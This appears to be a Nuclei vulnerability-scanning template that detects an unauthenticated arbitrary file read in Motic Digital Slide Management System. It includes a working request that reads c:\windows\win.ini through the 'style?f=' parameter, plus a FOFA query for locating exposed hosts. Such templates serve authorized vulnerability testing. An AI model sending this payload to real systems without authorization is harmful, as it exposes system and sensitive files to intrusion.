flow: http(1) && http(2)
http:
- matchers:
  - condition: and
    dsl:
    - contains(body,"Motic")
    - status_code == 200
    internal: true
    type: dsl
  raw:
  - 'GET /UploadService/Page/ HTTP/1.1

    Host: {{Hostname}}

    '
- matchers:
  - condition: and
    dsl:
    - contains_all(body,"bit app support","fonts","extensions")
    - contains(content_type,"text/css")
    - status_code == 200
    type: dsl
  raw:
  - 'GET /UploadService/Page/style?f=c:\windows\win.ini HTTP/1.1

    Host: {{Hostname}}

    '
id: motic-dsm-arbitrary-file-read
info:
  author: s4e-io
  description: 'Motic Digital Slide Management System style has an arbitrary file
    reading vulnerability. Unauthenticated attackers can exploit this vulnerability
    to read important system files, leaving the website in a highly insecure state.

    '
  metadata:
    fofa-query: icon_hash="617142232"
    max-request: 2
    product: moticdsm
    vendor: xiamen-motic
    verified: true
  name: MoticDSM - Arbitrary File Read
  reference:
  - https://blog.csdn.net/qq_41904294/article/details/141219553
  - https://blog.csdn.net/weixin_44337800/article/details/141328430
  severity: high
  tags: moticdsm,lfi,file-read,vuln
